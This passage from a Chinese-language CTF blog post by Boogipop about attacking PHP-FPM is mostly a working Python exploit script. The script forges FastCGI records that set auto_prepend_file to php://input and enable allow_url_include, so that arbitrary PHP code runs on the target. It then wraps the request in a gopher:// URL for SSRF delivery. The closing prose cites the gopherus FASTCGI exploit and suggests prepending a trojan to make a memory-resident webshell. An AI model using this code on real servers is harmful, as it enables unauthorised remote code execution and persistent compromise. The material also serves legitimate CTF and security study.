<span class="comment">#     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0)</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            self.sock.connect((self.host, <span class="built_in">int</span>(self.port)))</span><br><span class="line">        <span class="keyword">except</span> socket.error <span class="keyword">as</span> msg:</span><br><span class="line">            self.sock.close()</span><br><span class="line">            self.sock = <span class="literal">None</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">repr</span>(msg))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="comment">#return True</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__encodeFastCGIRecord</span>(<span class="params">self, fcgi_type, content, requestid</span>):</span><br><span class="line">        length = <span class="built_in">len</span>(content)</span><br><span class="line">        buf = bchr(FastCGIClient.__FCGI_VERSION) \</span><br><span class="line">               + bchr(fcgi_type) \</span><br><span class="line">               + bchr((requestid &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">               + bchr(requestid &amp; <span class="number">0xFF</span>) \</span><br><span class="line">               + bchr((length &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">               + bchr(length &amp; <span class="number">0xFF</span>) \</span><br><span class="line">               + bchr(<span class="number">0</span>) \</span><br><span class="line">               + bchr(<span class="number">0</span>) \</span><br><span class="line">               + content</span><br><span class="line">        <span class="keyword">return</span> buf</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__encodeNameValueParams</span>(<span class="params">self, name, value</span>):</span><br><span class="line">        nLen = <span class="built_in">len</span>(name)</span><br><span class="line">        vLen = <span class="built_in">len</span>(value)</span><br><span class="line">        record = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> nLen &lt; <span class="number">128</span>:</span><br><span class="line">            record += bchr(nLen)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            record += bchr((nLen &gt;&gt; <span class="number">24</span>) | <span class="number">0x80</span>) \</span><br><span class="line">                      + bchr((nLen &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">                      + bchr((nLen &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">                      + bchr(nLen &amp; <span class="number">0xFF</span>)</span><br><span class="line">        <span class="keyword">if</span> vLen &lt; <span class="number">128</span>:</span><br><span class="line">            record += bchr(vLen)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            record += bchr((vLen &gt;&gt; <span class="number">24</span>) | <span class="number">0x80</span>) \</span><br><span class="line">                      + bchr((vLen &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">                      + bchr((vLen &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">                      + bchr(vLen &amp; <span class="number">0xFF</span>)</span><br><span class="line">        <span class="keyword">return</span> record + name + value</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__decodeFastCGIHeader</span>(<span class="params">self, stream</span>):</span><br><span class="line">        header = <span class="built_in">dict</span>()</span><br><span class="line">        header[<span class="string">&#x27;version&#x27;</span>] = bord(stream[<span class="number">0</span>])</span><br><span class="line">        header[<span class="string">&#x27;type&#x27;</span>] = bord(stream[<span class="number">1</span>])</span><br><span class="line">        header[<span class="string">&#x27;requestId&#x27;</span>] = (bord(stream[<span class="number">2</span>]) &lt;&lt; <span class="number">8</span>) + bord(stream[<span class="number">3</span>])</span><br><span class="line">        header[<span class="string">&#x27;contentLength&#x27;</span>] = (bord(stream[<span class="number">4</span>]) &lt;&lt; <span class="number">8</span>) + bord(stream[<span class="number">5</span>])</span><br><span class="line">        header[<span class="string">&#x27;paddingLength&#x27;</span>] = bord(stream[<span class="number">6</span>])</span><br><span class="line">        header[<span class="string">&#x27;reserved&#x27;</span>] = bord(stream[<span class="number">7</span>])</span><br><span class="line">        <span class="keyword">return</span> header</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__decodeFastCGIRecord</span>(<span class="params">self, buffer</span>):</span><br><span class="line">        header = buffer.read(<span class="built_in">int</span>(self.__FCGI_HEADER_SIZE))</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> header:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            record = self.__decodeFastCGIHeader(header)</span><br><span class="line">            record[<span class="string">&#x27;content&#x27;</span>] = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;contentLength&#x27;</span> <span class="keyword">in</span> record.keys():</span><br><span class="line">                contentLength = <span class="built_in">int</span>(record[<span class="string">&#x27;contentLength&#x27;</span>])</span><br><span class="line">                record[<span class="string">&#x27;content&#x27;</span>] += buffer.read(contentLength)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;paddingLength&#x27;</span> <span class="keyword">in</span> record.keys():</span><br><span class="line">                skiped = buffer.read(<span class="built_in">int</span>(record[<span class="string">&#x27;paddingLength&#x27;</span>]))</span><br><span class="line">            <span class="keyword">return</span> record</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">request</span>(<span class="params">self, nameValuePairs=&#123;&#125;, post=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.__connect():</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;connect failure! please check your fasctcgi-server !!&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        requestId = random.randint(<span class="number">1</span>, (<span class="number">1</span> &lt;&lt; <span class="number">16</span>) - <span class="number">1</span>)</span><br><span class="line">        self.requests[requestId] = <span class="built_in">dict</span>()</span><br><span class="line">        request = <span class="string">b&quot;&quot;</span></span><br><span class="line">        beginFCGIRecordContent = bchr(<span class="number">0</span>) \</span><br><span class="line">                                 + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \</span><br><span class="line">                                 + bchr(self.keepalive) \</span><br><span class="line">                                 + bchr(<span class="number">0</span>) * <span class="number">5</span></span><br><span class="line">        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN,</span><br><span class="line">                                              beginFCGIRecordContent, requestId)</span><br><span class="line">        paramsRecord = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> nameValuePairs:</span><br><span class="line">            <span class="keyword">for</span> (name, value) <span class="keyword">in</span> nameValuePairs.items():</span><br><span class="line">                name = force_bytes(name)</span><br><span class="line">                value = force_bytes(value)</span><br><span class="line">                paramsRecord += self.__encodeNameValueParams(name, value)</span><br><span class="line">        <span class="keyword">if</span> paramsRecord:</span><br><span class="line">            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId)</span><br><span class="line">        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, <span class="string">b&#x27;&#x27;</span>, requestId)</span><br><span class="line">        <span class="keyword">if</span> post:</span><br><span class="line">            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId)</span><br><span class="line">        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, <span class="string">b&#x27;&#x27;</span>, requestId)</span><br><span class="line">        <span class="comment"># 前面都是构造的tcp数据包,下面是发送,所以我们可以直接注释掉下面内容,然后返回request</span></span><br><span class="line">        <span class="comment">#self.sock.send(request)</span></span><br><span class="line">        <span class="comment">#self.requests[requestId][&#x27;state&#x27;] = FastCGIClient.FCGI_STATE_SEND</span></span><br><span class="line">        <span class="comment">#self.requests[requestId][&#x27;response&#x27;] = &#x27;&#x27;</span></span><br><span class="line">        <span class="comment">#return self.__waitForResponse(requestId)</span></span><br><span class="line">        <span class="keyword">return</span> request</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__waitForResponse</span>(<span class="params">self, requestId</span>):</span><br><span class="line">        data = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            buf = self.sock.recv(<span class="number">512</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">len</span>(buf):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            data += buf</span><br><span class="line">        data = BytesIO(data)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            response = self.__decodeFastCGIRecord(data)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> response:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> response[<span class="string">&#x27;type&#x27;</span>] == FastCGIClient.__FCGI_TYPE_STDOUT \</span><br><span class="line">                    <span class="keyword">or</span> response[<span class="string">&#x27;type&#x27;</span>] == FastCGIClient.__FCGI_TYPE_STDERR:</span><br><span class="line">                <span class="keyword">if</span> response[<span class="string">&#x27;type&#x27;</span>] == FastCGIClient.__FCGI_TYPE_STDERR:</span><br><span class="line">                    self.requests[<span class="string">&#x27;state&#x27;</span>] = FastCGIClient.FCGI_STATE_ERROR</span><br><span class="line">                <span class="keyword">if</span> requestId == <span class="built_in">int</span>(response[<span class="string">&#x27;requestId&#x27;</span>]):</span><br><span class="line">                    self.requests[requestId][<span class="string">&#x27;response&#x27;</span>] += response[<span class="string">&#x27;content&#x27;</span>]</span><br><span class="line">            <span class="keyword">if</span> response[<span class="string">&#x27;type&#x27;</span>] == FastCGIClient.FCGI_STATE_SUCCESS:</span><br><span class="line">                self.requests[requestId]</span><br><span class="line">        <span class="keyword">return</span> self.requests[requestId][<span class="string">&#x27;response&#x27;</span>]</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__repr__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;fastcgi connect host:&#123;&#125; port:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(self.host, self.port)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&#x27;Php-fpm code execution vulnerability client.&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;host&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;Target host, such as 127.0.0.1&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;file&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;A php file absolute path, such as /usr/local/lib/php/System.php&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-c&#x27;</span>, <span class="string">&#x27;--code&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;What php code your want to execute&#x27;</span>, default=<span class="string">&#x27;&lt;?php phpinfo(); exit; ?&gt;&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-p&#x27;</span>, <span class="string">&#x27;--port&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;FastCGI port&#x27;</span>, default=<span class="number">9000</span>, <span class="built_in">type</span>=<span class="built_in">int</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    client = FastCGIClient(args.host, args.port, <span class="number">3</span>, <span class="number">0</span>)</span><br><span class="line">    params = <span class="built_in">dict</span>()</span><br><span class="line">    documentRoot = <span class="string">&quot;/&quot;</span></span><br><span class="line">    uri = args.file</span><br><span class="line">    content = args.code</span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">&#x27;GATEWAY_INTERFACE&#x27;</span>: <span class="string">&#x27;FastCGI/1.0&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;REQUEST_METHOD&#x27;</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;SCRIPT_FILENAME&#x27;</span>: documentRoot + uri.lstrip(<span class="string">&#x27;/&#x27;</span>),</span><br><span class="line">        <span class="string">&#x27;SCRIPT_NAME&#x27;</span>: uri,</span><br><span class="line">        <span class="string">&#x27;QUERY_STRING&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;REQUEST_URI&#x27;</span>: uri,</span><br><span class="line">        <span class="string">&#x27;DOCUMENT_ROOT&#x27;</span>: documentRoot,</span><br><span class="line">        <span class="string">&#x27;SERVER_SOFTWARE&#x27;</span>: <span class="string">&#x27;php/fcgiclient&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;REMOTE_ADDR&#x27;</span>: <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;REMOTE_PORT&#x27;</span>: <span class="string">&#x27;9985&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;SERVER_ADDR&#x27;</span>: <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;SERVER_PORT&#x27;</span>: <span class="string">&#x27;80&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;SERVER_NAME&#x27;</span>: <span class="string">&quot;localhost&quot;</span>,</span><br><span class="line">        <span class="string">&#x27;SERVER_PROTOCOL&#x27;</span>: <span class="string">&#x27;HTTP/1.1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;CONTENT_TYPE&#x27;</span>: <span class="string">&#x27;application/text&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;CONTENT_LENGTH&#x27;</span>: <span class="string">&quot;%d&quot;</span> % <span class="built_in">len</span>(content),</span><br><span class="line">        <span class="string">&#x27;PHP_VALUE&#x27;</span>: <span class="string">&#x27;auto_prepend_file = php://input&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;PHP_ADMIN_VALUE&#x27;</span>: <span class="string">&#x27;allow_url_include = On&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment"># 这里调用request,然后返回tcp数据流,所以修改这里url编码一下就好了</span></span><br><span class="line">    <span class="comment">#response = client.request(params, content)</span></span><br><span class="line">    <span class="comment">#print(force_text(response))</span></span><br><span class="line">    request_ssrf = urlparse.quote(client.request(params, content))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;gopher://127.0.0.1:&quot;</span> + <span class="built_in">str</span>(args.port) + <span class="string">&quot;/_&quot;</span> + request_ssrf)</span><br></pre></td></tr></table></figure>
<p>改成gopher协议就好了<br>或者利用gopherus去打<code>gopherus --exploit FASTCGI</code>即可</p>
<h2 id="（3）PHP-FPM内存马"><a href="#（3）PHP-FPM内存马" class="headerlink" title="（3）PHP-FPM内存马"></a>（3）PHP-FPM内存马</h2><p>可以看看葵姐姐的文章<br><a target="_blank" rel="noopener" href="https://amiaaaz.github.io/2022/09/13/php-fpm-mem-shell-study-notes/#php-fpm%E5%81%9A%E5%86%85%E5%AD%98%E9%A9%AC">https://amiaaaz.github.io/2022/09/13/php-fpm-mem-shell-study-notes/#php-fpm%E5%81%9A%E5%86%85%E5%AD%98%E9%A9%AC</a><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1684247298836-7530bf88-4dcd-4442-a7ff-d0d6ca77ef78.png#averageHue=%23ebf0f3&clientId=u2a8af4d4-09ad-4&from=paste&height=678&id=u7838bcea&originHeight=848&originWidth=1110&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=237299&status=done&style=none&taskId=uf035a62f-f781-4354-802c-4f165c62ab3&title=&width=888" alt="image.png"><br>这里说到了只需要换一下auto_prepend_file的内容为一个木马就可以拉~</p>

    </div>

    
    <div class="about">
        <h1>About this Post</h1>
        <div class="details">
            <p>This post is written by Boogipop, licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
        </div>
        
        <p class="tags">
            
            <i class="icon"></i>
            <a href="/tags/CTF/" class="tag">#CTF</a><a href="/tags/FASTCGI/" class="tag">#FASTCGI</a>
        </p>
        
    </div>
    

    <div class="container post-prev-next">
        
        <a href="/2023/05/18/Resin&amp;&amp;XBean%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%AD%A6%E4%B9%A0/" class="next">
            <div>
                <div class="text">
                    <p class="label">Next</p>
                    <h3 class="title">Resin&amp;&amp;XBean反序列化利用链学习</h3>
                </div>
            </div>
        </a>
        
        
        <a href="/2023/05/16/LitCTF%20Writeup%20By%20%E7%90%86%E5%A1%98%E6%9C%80%E9%80%9F%E4%BC%A0%E8%AF%B4%E3%81%A8%E7%BB%9D%E5%87%B6%E3%81%AE%E7%8C%9B%E8%99%8E/" class="prev">
            <div>
                <div class="text">
                    <p class="label">Previous</p>
                    <h3 class="title">LitCTF Writeup By 理塘最速传说と绝凶の猛虎</>
                </div>
            </div>
        </a>
        
    </div>

    
        
        
        <script src="https://giscus.app/client.js" data-repo="Boogipop/Boogipop.github.io" data-repo-id="R_kgDOIFi78g" data-category="Announcements" data-category-id="DIC_kwDOIFi78s4Cav9f" data-mapping="pathname" data-strict="1" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="top" data-theme="preferred_color_scheme" data-lang="zh-CN" crossorigin="anonymous" async></script>
        
    
</article>

        <footer>
    <div class="inner">
        <div class="links">
            
            <div class="group">
                <h2 class="title">Blog</h2>
                
                <a href="/" class="item">Blog</a>
                
                <a href="/archives" class="item">Archives</a>
                
                <a href="/tags" class="item">Tags</a>
                
                <a href="/categories" class="item">Categories</a>
                
                <a href="/search" class="item">Search</a>
                
                <a href="/friends" class="item">Friends</a>
                
                <a href="/about" class="item">About</a>
                
                <a href="/atom.xml" class="item">RSS</a>
                
            </div>
            
            <div class="group">
                <h2 class="title">Projects</h2>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/rsa-cli" class="item">RSA CLI</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/hexo-theme-cupertino" class="item">Hexo Theme Cupertino</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/a-calendar" class="item">A Calendar</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/auto-mirroring-bucket" class="item">Auto Mirroring Bucket</a>
                
            </div>
            
            <div class="group">
                <h2 class="title">Me</h2>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom" class="item">GitHub</a>
                
                <a target="_blank" rel="noopener" href="https://codepen.io/mrwillcom" class="item">CodePen</a>
                
                <a target="_blank" rel="noopener" href="https://www.patreon.com/MrWillCom" class="item">Patreon</a>
                
                <a target="_blank" rel="noopener" href="https://noc.social/@MrWillCom" class="item">Mastodon</a>
                
                <a target="_blank" rel="noopener" href="https://discord.gg/UKuFDjcfY8" class="item">Discord</a>
                
                <a href="mailto:mr.will.com@outlook.com" class="item">Email</a>
                
            </div>
            
        </div>
        <span>&copy; 2024 Boogipop<br>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> </span>
        
        
            <br>
            <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
                <label>
                    <input type="radio" value="light">
                    <span>Light</span>
                </label>
                <label>
                    <input type="radio" value="dark">
                    <span>Dark</span>
                </label>
                <label>
                    <input type="radio" value="auto">
                    <span>Auto</span>
                </label>
            </div>
        
    </div>
</footer>


        
<script src="/js/main.js"></script>

        
        
        

        
        <script src="https://unpkg.com/scrollreveal"></script>
		
        <script>
            window.addEventListener('load', () => {
                ScrollReveal({ delay: 250, reset: true, easing: 'cubic-bezier(0, 0, 0, 1)' })
                ScrollReveal().reveal('.post-list-item .cover-img img')
                ScrollReveal().reveal('.post-list-item, .card, .content p img, .content .block-large img', { distance: '60px', origin: 'bottom', duration: 800 })
            })
        </script>
        
    </body>
</html>